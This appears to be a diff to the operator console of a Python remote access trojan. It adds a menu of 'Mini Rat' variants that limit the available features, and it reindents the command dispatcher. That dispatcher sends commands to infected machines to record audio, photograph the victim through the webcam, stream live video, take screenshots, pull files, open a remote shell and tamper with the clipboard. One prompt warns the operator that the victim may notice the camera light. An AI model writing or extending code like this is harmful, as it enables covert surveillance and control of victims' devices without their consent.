@@ -438,6 +438,43 @@ def main(mode):
         except ValueError:
             pass
     sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    MINmode=None
+    while not (MINmode=='y' or MINmode=='n'):
+        MINmode=input(f"{Fore.LIGHTGREEN_EX}\n[*] Do you want to use the Mini Rat Launcher[Y/n] ?").lower()
+    limitations=[None]
+    if MINmode=='y':
+        clear()
+        model=input(f"""{Fore.LIGHTCYAN_EX}
+                        [ Menu ]
+
+        [ 1 ] Spy rat              [ 2 ] CMD rat
+
+        [ 3 ] PoPuP rat            [ 4 ] Fun Rat
+
+        Select your Mini Rat model : {Fore.RESET}""")
+        if model=='1':
+            clear()
+            spyRatModel=input(f"""{Fore.LIGHTGREEN_EX}
+                        [ Menu ]
+
+        [ 1 ] SpyRat1              [ 2 ] SpyRat2
+
+        [ 3 ] SpyRat2
+
+        Select your SpyRat model : {Fore.RESET}""")
+            if spyRatModel=='1':
+                limitations=[6,7,8,9]
+            elif spyRatModel=='2':
+                limitations=[4,6,7,8,9]
+            elif spyRatModel=='3':
+                limitations=[3,4,6,7,8,9]
+        elif model=='2':
+            limitations=[1,2,3,4,5,7,8,9]
+        elif model=='3':
+            limitations=[1,2,3,4,5,6,8,9]
+        elif model=='4':
+            limitations=[1,2,3,4,5,6,7,8]
+    MLmode=None
     try:
         if mode=="server":
             while 1:
@@ -446,7 +483,6 @@ def main(mode):
                     break
                 except ValueError:
                     pass
-            MLmode=0
             while not (MLmode=='y' or MLmode=='n'):
                 MLmode=input(f"{Fore.LIGHTGREEN_EX}\n[*] Do you want to enable Multiple Clients[Y/n] ?").lower()
             sock.bind((host,port))
@@ -499,7 +535,7 @@ def main(mode):
     addrs=""
     for i in range(len(rats)):
         addrs+=f"\n\n[ {i+1} ] {rats[i][1][0]}:{rats[i][1][1]}"
-    GratMenu=1
+        GratMenu=1
     while 1:
         clear()
         if MLmode=='y' and GratMenu:
@@ -540,56 +576,61 @@ def main(mode):
 /____________________________________________________________\{Fore.RESET}
 
 Enter your selection : """)
-        
-        if selection=='1':
-            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
-            sock.send("Rsound".encode())
-            sleep(0.25)
-            sec=input(f"{Fore.LIGHTYELLOW_EX}\n[*]Please enter the recording time (seconds) : {Fore.RESET}")
-            getSound(sock,sec)
-        elif selection=='2':
-            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
-            sock.send("Tpict".encode())
-            sleep(1)
-            getPict(sock)
-        elif selection=='3':
-            selection=input(f"{Fore.RED}{Back.BLACK}[W] Warning If you use this option for a long time, the victim may notice\n that the device is infected due to the camera light coming on\n\nDo you want to continue[N/y] ? {Fore.RESET}{Back.RESET}")
-            if selection.lower() =='y':
-                print(f"{Fore.YELLOW}[*] Sending command to RAT .{Fore.RESET}")
-                sock.send("Glive".encode())
-                sleep(1)
-                getLive(sock)
-        elif selection=='4':
-            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
-            sock.send("Tscr".encode())
-            sleep(1)
-            getScr(sock)
-        elif selection=='5':
-            try:
-                while 1:
-                    getFex(sock)
-            except KeyboardInterrupt :
-                pass
-        elif selection=='6':
-            clear()
-            key=input(f"{Fore.LIGHTBLUE_EX}Enter the encryption / decryption token : {Fore.RESET}")
-            try:
-                shell(sock,key)
-            except KeyboardInterrupt:
-                sock.send(encryptFS("END",key))
-        elif selection=='7':
-            clear()
-            try:
-                popup(sock)
-            except KeyboardInterrupt:
-                pass
-        elif selection=='8':
-            RWclip(sock)
-        elif selection=='9':
-            try:
-                others(sock)
-            except KeyboardInterrupt:
-                pass
-        elif selection=='10':
-            if MLmode=='y':
-                GratMenu=1
+        try:
+            if limitations and (not int(selection) in limitations):
+                if selection=='1':
+                        print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
+                        sock.send("Rsound".encode())
+                        sleep(0.25)
+                        sec=input(f"{Fore.LIGHTYELLOW_EX}\n[*]Please enter the recording time (seconds) : {Fore.RESET}")
+                        getSound(sock,sec)
+                elif selection=='2':
+                    print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
+                    sock.send("Tpict".encode())
+                    sleep(1)
+                    getPict(sock)
+                elif selection=='3':
+                    selection=input(f"{Fore.RED}{Back.BLACK}[W] Warning If you use this option for a long time, the victim may notice\n that the device is infected due to the camera light coming on\n\nDo you want to continue[N/y] ? {Fore.RESET}{Back.RESET}")
+                    if selection.lower() =='y':
+                        print(f"{Fore.YELLOW}[*] Sending command to RAT .{Fore.RESET}")
+                        sock.send("Glive".encode())
+                        sleep(1)
+                        getLive(sock)
+                elif selection=='4':
+                    print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
+                    sock.send("Tscr".encode())
+                    sleep(1)
+                    getScr(sock)
+                elif selection=='5':
+                    try:
+                        while 1:
+                            getFex(sock)
+                    except KeyboardInterrupt :
+                        pass
+                elif selection=='6':
+                    clear()
+                    key=input(f"{Fore.LIGHTBLUE_EX}Enter the encryption / decryption token : {Fore.RESET}")
+                    try:
+                        shell(sock,key)
+                    except KeyboardInterrupt:
+                        sock.send(encryptFS("END",key))
+                elif selection=='7':
+                    clear()
+                    try:
+                        popup(sock)
+                    except KeyboardInterrupt:
+                        pass
+                elif selection=='8':
+                    RWclip(sock)
+                elif selection=='9':
+                    try:
+                        others(sock)
+                    except KeyboardInterrupt:
+                        pass
+                elif selection=='10':
+                    if MLmode=='y':
+                        GratMenu=1
+            else :
+                input(f"{Fore.LIGHTRED_EX}[ ! ] Your rat model does not support this option !\n\nEnter to continue : {Fore.RESET}")
+        except ValueError:
+            pass
